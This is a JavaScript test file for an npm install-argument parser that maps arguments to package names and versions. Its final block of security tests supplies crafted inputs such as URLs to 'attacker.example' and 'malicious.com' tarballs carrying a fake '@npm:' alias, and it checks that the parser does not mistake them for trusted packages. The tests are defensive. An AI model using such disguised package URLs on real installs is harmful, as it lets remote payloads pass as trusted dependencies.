import { describe, it } from "node:test";
import assert from "node:assert";
import { parsePackagesFromInstallArgs } from "./parsePackagesFromInstallArgs.js";

describe("parsePackagesFromInstallArgs", () => {
  it("should return an empty array for no changes", () => {
    const args = ["install"];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, []);
  });

  it("should return an array of changes for one package", () => {
    const args = ["install", "@jest/transform@29.7.0"];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, [{ name: "@jest/transform", version: "29.7.0" }]);
  });

  it("should return the package in the format @vercel/otel", () => {
    const args = ["install", "@vercel/otel"];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, [{ name: "@vercel/otel", version: "latest" }]);
  });

  it("should return an array of changes for multiple packages", () => {
    const args = ["install", "express@4.17.1", "lodash@4.17.21"];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, [
      { name: "express", version: "4.17.1" },
      { name: "lodash", version: "4.17.21" },
    ]);
  });

  it("should ignore options and return an array of changes", () => {
    const args = [
      "install",
      "--save-dev",
      "express@4.17.1",
      "--save-exact",
      "lodash@4.17.21",
    ];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, [
      { name: "express", version: "4.17.1" },
      { name: "lodash", version: "4.17.21" },
    ]);
  });

  it("should ignore options with parameters and return an array of changes", () => {
    const args = [
      "install",
      "--save-dev",
      "express@4.17.1",
      "--loglevel",
      "error",
      "lodash@4.17.21",
    ];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, [
      { name: "express", version: "4.17.1" },
      { name: "lodash", version: "4.17.21" },
    ]);
  });

  it("should not ignore the next argument if it is passed directly with the option", () => {
    const args = [
      "install",
      "--save-dev",
      "express@4.17.1",
      "--loglevel=error",
      "lodash@4.17.21",
    ];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, [
      { name: "express", version: "4.17.1" },
      { name: "lodash", version: "4.17.21" },
    ]);
  });

  it("should set the default tag for packages", () => {
    const args = ["install", "express", "lodash@4.17.21"];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, [
      { name: "express", version: "latest" },
      { name: "lodash", version: "4.17.21" },
    ]);
  });

  it("should set the default tag for packages with a specific tag", () => {
    const args = ["install", "express", "lodash@4.17.21", "--tag", "beta"];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, [
      { name: "express", version: "beta" },
      { name: "lodash", version: "4.17.21" },
    ]);
  });

  it("should ignore alias", () => {
    const args = ["install", "express@npm:express@4.17.1"];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, [{ name: "express", version: "4.17.1" }]);
  });

  it("should parse version even for aliased packages", () => {
    const args = ["install", "express@npm:express@4.17.1"];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, [{ name: "express", version: "4.17.1" }]);
  });

  it("should parse scoped packages", () => {
    const args = ["install", "@scope/package@1.0.0"];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, [{ name: "@scope/package", version: "1.0.0" }]);
  });

  it("should parse packages with version ranges", () => {
    const args = ["install", "express@^4.17.1"];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, [{ name: "express", version: "^4.17.1" }]);
  });

  it("should parse package folders", () => {
    const args = ["install", "./local-package"];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, [{ name: "./local-package", version: "latest" }]);
  });

  it("should parse tarballs", () => {
    const args = ["install", "file:./local-package.tgz"];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, [
      { name: "file:./local-package.tgz", version: "latest" },
    ]);
  });

  it("should parse tarball URLs", () => {
    const args = ["install", "https://example.com/local-package.tgz"];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, [
      { name: "https://example.com/local-package.tgz", version: "latest" },
    ]);
  });

  it("should parse git URLs", () => {
    const args = ["install", "git://github.com/npm/cli.git"];

    const result = parsePackagesFromInstallArgs(args);

    assert.deepEqual(result, [
      { name: "git://github.com/npm/cli.git", version: "latest" },
    ]);
  });

  // Security tests for @npm: alias bypass vulnerability
  describe("security: @npm: alias validation", () => {
    it("should NOT strip @npm: from URL with @npm: in query parameter", () => {
      // This is the exploit scenario from the pentest
      const args = [
        "install",
        "https://attacker.example/payload.tgz?x=@npm:lodash",
      ];

      const result = parsePackagesFromInstallArgs(args);

      // The URL should remain unchanged, NOT be reduced to "lodash"
      assert.deepEqual(result, [
        {
          name: "https://attacker.example/payload.tgz?x=@npm:lodash",
          version: "latest",
        },
      ]);
    });

    it("should NOT strip @npm: from URL with @npm: in path", () => {
      const args = [
        "install",
        "https://attacker.example/@npm:lodash/payload.tgz",
      ];

      const result = parsePackagesFromInstallArgs(args);

      // The URL should remain unchanged
      assert.deepEqual(result, [
        {
          name: "https://attacker.example/@npm:lodash/payload.tgz",
          version: "latest",
        },
      ]);
    });

    it("should NOT strip @npm: from http URL with @npm: marker", () => {
      const args = [
        "install",
        "http://malicious.com/package.tgz?alias=@npm:safe-package",
      ];

      const result = parsePackagesFromInstallArgs(args);

      // The URL should remain unchanged, NOT be reduced to "safe-package"
      assert.deepEqual(result, [
        {
          name: "http://malicious.com/package.tgz?alias=@npm:safe-package",
          version: "latest",
        },
      ]);
    });

    it("should NOT strip @npm: from file path with @npm: marker", () => {
      const args = ["install", "./local/@npm:package"];

      const result = parsePackagesFromInstallArgs(args);

      // File paths should not be treated as aliases
      assert.deepEqual(result, [
        { name: "./local/@npm:package", version: "latest" },
      ]);
    });

    it("should NOT strip @npm: from absolute file path with @npm: marker", () => {
      const args = ["install", "/tmp/@npm:package"];

      const result = parsePackagesFromInstallArgs(args);

      // Absolute paths should not be treated as aliases
      assert.deepEqual(result, [{ name: "/tmp/@npm:package", version: "latest" }]);
    });

    it("should NOT strip @npm: from Windows path with @npm: marker", () => {
      const args = ["install", "C:\\packages\\@npm:lodash"];

      const result = parsePackagesFromInstallArgs(args);

      // Windows paths should not be treated as aliases
      assert.deepEqual(result, [
        { name: "C:\\packages\\@npm:lodash", version: "latest" },
      ]);
    });

    it("should NOT strip @npm: from file: protocol URL with @npm: marker", () => {
      const args = ["install", "file:///tmp/@npm:package.tgz"];

      const result = parsePackagesFromInstallArgs(args);

      // file: protocol should not be treated as an alias
      assert.deepEqual(result, [
        { name: "file:///tmp/@npm:package.tgz", version: "latest" },
      ]);
    });

    it("should strip @npm: from valid npm alias", () => {
      // This is a legitimate npm alias and should be processed
      const args = ["install", "server@npm:http-server@14.1.1"];

      const result = parsePackagesFromInstallArgs(args);

      // Valid alias should be stripped
      assert.deepEqual(result, [{ name: "http-server", version: "14.1.1" }]);
    });

    it("should strip @npm: from valid scoped package alias", () => {
      const args = ["install", "my-alias@npm:@scope/package@1.0.0"];

      const result = parsePackagesFromInstallArgs(args);

      // Valid alias with scoped package should be stripped
      assert.deepEqual(result, [
        { name: "@scope/package", version: "1.0.0" },
      ]);
    });

    it("should strip @npm: from valid alias without version", () => {
      const args = ["install", "server@npm:http-server"];

      const result = parsePackagesFromInstallArgs(args);

      // Valid alias without version should be stripped
      assert.deepEqual(result, [{ name: "http-server", version: "latest" }]);
    });

    it("should NOT strip @npm: when alias name is empty", () => {
      const args = ["install", "@npm:lodash"];

      const result = parsePackagesFromInstallArgs(args);

      // Empty alias name should not be treated as valid alias
      assert.deepEqual(result, [{ name: "@npm:lodash", version: "latest" }]);
    });

    it("should handle multiple packages with mixed valid and invalid @npm: markers", () => {
      const args = [
        "install",
        "https://attacker.example/payload.tgz?x=@npm:lodash",
        "server@npm:http-server",
      ];

      const result = parsePackagesFromInstallArgs(args);

      // First package should remain unchanged, second should be stripped
      assert.deepEqual(result, [
        {
          name: "https://attacker.example/payload.tgz?x=@npm:lodash",
          version: "latest",
        },
        { name: "http-server", version: "latest" },
      ]);
    });

    it("should NOT strip @npm: from git URL with @npm: marker", () => {
      const args = ["install", "git://github.com/user/@npm:repo"];

      const result = parsePackagesFromInstallArgs(args);

      // Git URLs should not be treated as aliases
      assert.deepEqual(result, [
        { name: "git://github.com/user/@npm:repo", version: "latest" },
      ]);
    });
  });
});
